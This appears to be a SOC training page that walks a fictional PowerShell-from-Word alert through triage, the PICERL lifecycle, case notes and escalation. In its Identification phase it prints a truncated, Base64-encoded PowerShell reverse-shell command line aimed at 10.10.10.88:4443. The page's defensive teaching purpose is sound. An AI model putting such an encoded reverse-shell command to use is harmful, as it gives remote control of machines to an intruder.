---
layout: default
title: 06: The Anatomy of an Investigation
nav_order: 6
---

# Part 1: The First 5 Minutes: Triage and Prioritization

**Goal:** To learn how to perform "triage" on a new alert to quickly determine if it's a real fire, a false alarm, or something in between.

### Key Concepts (The Theory)

- **Triage:** The process of sorting new alerts based on severity and priority to ensure the most critical threats are handled first.
- **Alert Fidelity:** The trustworthiness of the alert source. An alert from your EDR for "Known Ransomware" is high-fidelity. An alert for "User logged in from a new country" is lower fidelity, as it could be legitimate travel.
- **Severity vs. Priority:**
  - **Severity:** How bad the event _could_ be (e.g., High, Medium, Low). This is often set by the tool.
  - **Priority:** The order in which _you_ should handle it. This is determined by the analyst, combining severity with business context.

### The Initial Triage Checklist

When a new alert hits your queue, you should quickly try to make an initial assessment. Run through these questions:

1.  **What is the alert?** (e.g., "PowerShell spawned from non-standard process," "Impossible travel detected.")
2.  **What is the asset?** Is it a domain controller, a web server, or a standard user's laptop? An alert on a critical server is always a higher priority.
3.  **Who is the user?** Is it a standard user, a developer, an executive (VIP), or a domain administrator? An alert on an admin account is extremely high priority because their credentials grant broad access.
4.  **What is the assigned severity?** (High, Medium, Low).

- **Analyst Tip:** The goal of triage is not to solve the case but to decide what to work on next. A `Medium` severity alert on a domain controller is a higher priority than a `High` severity alert on a test machine that's scheduled to be wiped tomorrow. Context is everything.

---

## Part 2: The Investigation Lifecycle (PICERL)

**Goal:** To use the industry-standard PICERL framework to structure an investigation from start to finish. PICERL stands for **P**reparation, **I**dentification, **C**ontainment, **E**radication, **R**ecovery, and **L**essons Learned.

### A Running Example: The Suspicious PowerShell Alert

Let's use a single alert and walk it through the lifecycle:
**The Alert:** `High Severity: powershell.exe spawned by WINWORD.EXE on workstation WKS-1337, user: bart.simpson`

---

### **Phase 1: Identification**

This is where you confirm if the alert is a **True Positive** (a real incident) or a **False Positive**. This phase uses a mini-loop of Observe-Orient-Decide-Act.

1.  **Observe (Gather the raw facts):**

    - **Host:** WKS-1337
    - **User:** bart.simpson
    - **Process:** `powershell.exe`
    - **Parent Process:** `WINWORD.EXE`
    - **From the EDR logs, you pull the full command line:** `powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAwAC4AOAA4ACIALAA0ADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUA MwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAe...`

2.  **Orient (Give the facts context):**

    - The parent process is Word. This is highly suspicious. Word should not be launching PowerShell. This is a classic indicator of a malicious macro. **(T1566.001: Spearphishing Attachment)**
    - The `-enc` flag means the command is Base64 encoded. This is a common technique for **Obfuscated Files or Information (T1027)**.
    - You decode the Base64 string. It reveals a PowerShell reverse shell script trying to connect to IP `10.10.10.88` on port `4443`. This is a **Reverse Shell (T1059.001: PowerShell)**.
    - You check the destination IP `10.10.10.88`. It's an internal, non-routable IP. This suggests the attacker may already have a foothold inside the network and this is an attempt at **Lateral Movement (TA0008)**.

3.  **Decide (Form a hypothesis):**
    - This is a **True Positive**. The user likely opened a malicious Word document, which executed a macro to launch a PowerShell reverse shell, a common technique for **Execution (TA0002)**, attempting to connect to an internal C2 server.

---

### **Phase 2: Containment**

**Goal:** Stop the bleeding! Prevent the attacker from causing more damage.

- **Action:** Based on your decision, you take immediate action. Using your EDR console, you trigger the **"Isolate Host"** function for `WKS-1337`. This uses the EDR agent to block all network connections on the workstation _except_ for the connection back to the EDR management server, so you can still investigate it remotely.
- **Action:** You also temporarily disable the `bart.simpson` user account in Active Directory / Entra ID to prevent the attacker from using stolen credentials to log in elsewhere.

---

### **Phase 3 & 4: Eradication and Recovery**

**Goal:** Remove the attacker from the environment and restore the system to a known-good state. This is often handled by a different team.

- **Eradication:** The original malicious file (`phish.docx`) is deleted. Any other files or persistence mechanisms created by the attacker are removed.
- **Recovery:** The workstation is wiped and re-imaged from a clean, golden image. This is the only way to be 100% sure the attacker is gone. The user account is re-enabled with a new password.

---

### **Phase 5: Lessons Learned**

**Goal:** Improve your defenses so this doesn't happen again.

- A post-incident meeting is held. Questions to ask:
  - How did the malicious email get past our email security gateway?
  - Why was the user able to run macros?
  - Did our EDR alert quickly enough?
- **Outcomes:** You might create a new rule in the email filter to block similar attachments, or push a new policy to disable macros for most users.

---

## Part 3: Case Management and Escalation

**Goal:** To understand the importance of good documentation and know when to ask for help.

### A Good Case Note

Your notes should be clear enough that a teammate can pick up the investigation right where you left off.

> **14:32 UTC:** Initial alert triage. High-severity alert for PowerShell spawned from WINWORD.EXE on WKS-1337 (user: bart.simpson). Given the TTP, immediately began investigation.
>
> **14:35 UTC:** Pulled command line from EDR. Confirmed use of Base64 encoding (`-enc` flag).
>
> **14:37 UTC:** Decoded Base64 payload. Revealed PowerShell reverse shell attempting connection to internal IP `10.10.10.88:4443`.
>
> **14:38 UTC:** **Declared incident.** This is a True Positive.
>
> .
> **14:39 UTC:** **Containment:** Isolated host WKS-1337 via EDR console. Temporarily disabled user `bart.simpson` in AD.
>
> **14:40 UTC:** **Escalation:** Escalated ticket to Tier 2 Incident Response team for eradication and recovery. Notified SOC lead.

### When to Escalate

- As soon as you **declare an incident** (confirm a True Positive).
- If the alert involves a VIP user or a critical system (e.g., a domain controller).
- If you are about to take a significant action you are unsure about.
- If you are stuck for more than 15-20 minutes on the "Identification" phase. It's better to get a second pair of eyes than to let an attacker dwell in the network.
